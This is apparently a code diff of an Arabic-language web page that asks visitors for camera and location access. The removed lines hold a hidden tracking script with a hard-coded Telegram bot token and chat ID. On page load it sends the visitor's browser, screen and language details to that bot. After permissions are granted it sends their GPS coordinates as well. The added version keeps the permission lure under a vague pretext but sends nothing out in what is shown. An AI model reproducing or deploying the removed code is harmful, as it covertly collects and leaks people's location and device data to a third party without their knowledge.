@@ -11,91 +11,59 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background-color: #f0f0f0;
+            background-color: #f0f8ff;
             font-family: Arial, sans-serif;
             direction: rtl;
+        }
+        .container {
+            width: 300px;
             text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
         }
-        #permission-message {
-            font-size: 20px;
+        h1 {
+            margin: 0;
+            font-size: 28px;
             color: #333;
-            margin-bottom: 20px;
         }
-        #request-button {
-            padding: 10px 20px;
-            font-size: 18px;
-            background-color: #4CAF50;
-            color: white;
+        p {
+            margin: 15px 0;
+            color: #555;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
             border: none;
             border-radius: 5px;
+            background-color: #007bff;
+            color: white;
             cursor: pointer;
+            transition: background-color 0.3s;
         }
-        #request-button:hover {
-            background-color: #45a049;
+        button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
-    <div id="permission-message">الرجاء السماح بالوصول إلى الموقع والكاميرا للمتابعة</div>
-    <button id="request-button" onclick="requestPermissions()">السماح بالأذونات</button>
+    <div class="container">
+        <h1>مرحبا بك!</h1>
+        <p>لإتمام العملية، يرجى السماح بالوصول إلى الكاميرا والموقع.</p>
+        <button id="requestPermissions">السماح بالأذونات</button>
+    </div>
 
     <script>
-        const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
-        const chatId = '6185375878';
-
-        // إرسال الرسالة الأولية إلى Telegram فور دخول المستخدم الموقع
-        function sendInitialData() {
-            const userAgent = navigator.userAgent;
-            const screenWidth = window.screen.width;
-            const screenHeight = window.screen.height;
-            const language = navigator.language || navigator.userLanguage;
-            const initialMessage = `
-                🖥️ معلومات أولية عند الدخول:
-                📏 عرض الشاشة: ${screenWidth}px
-                📏 ارتفاع الشاشة: ${screenHeight}px
-                🌐 لغة المتصفح: ${language}
-                🖥️ متصفح ونظام التشغيل: ${userAgent}
-            `;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({ chat_id: chatId, text: initialMessage })
-            }).catch(error => console.error('خطأ في إرسال البيانات الأولية:', error));
-        }
-
-        sendInitialData();
-
-        // طلب الأذونات
-        function requestPermissions() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(() => {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-                            const locationMessage = `
-                                📍 تم الحصول على الموقع بعد منح الإذن:
-                                🌍 خط العرض: ${latitude}
-                                🌍 خط الطول: ${longitude}
-                            `;
-                            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                                body: new URLSearchParams({ chat_id: chatId, text: locationMessage })
-                            }).then(() => window.location.href = "waitingPage.html")
-                            .catch(error => console.error('خطأ في إرسال الموقع:', error));
-                        },
-                        (error) => {
-                            console.error('لم يتم منح إذن الموقع:', error);
-                            alert('يجب السماح بالوصول إلى الموقع للمتابعة.');
-                        }
-                    );
-                })
-                .catch((error) => {
-                    console.error('خطأ في الوصول إلى الكاميرا:', error);
-                    alert('يجب السماح بالوصول إلى الكاميرا للمتابعة.');
-                });
-        }
+        document.getElementById('requestPermissions').onclick = async () => {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            await navigator.geolocation.getCurrentPosition(() => {
+                window.location.href = "second.html"; // الانتقال للصفحة الثانية بعد الحصول على الأذونات
+            }, () => {
+                alert('لم يُسمح بالوصول إلى الموقع');
+            });
+        };
     </script>
 </body>
 </html>
